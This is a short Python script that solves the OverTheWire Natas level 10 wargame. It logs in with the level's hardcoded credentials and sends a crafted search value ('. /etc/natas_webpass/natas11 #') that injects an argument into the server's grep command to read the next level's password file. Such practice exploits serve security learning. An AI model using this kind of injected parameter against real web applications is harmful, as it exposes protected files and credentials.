import re, requests
from bs4 import BeautifulSoup

username = "natas10"
password = "D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE"
url = 'http://' + username + '.natas.labs.overthewire.org'
auth = (username, password)
params = {"needle":". /etc/natas_webpass/natas11 #", "submit": "submit"}
r = requests.get(url , auth=auth, params=params)
# print(r.text)
print(re.findall(r'<pre>\n(.*)\n</pre>', r.text))
# print(BeautifulSoup(r.text, "html.parser").text)
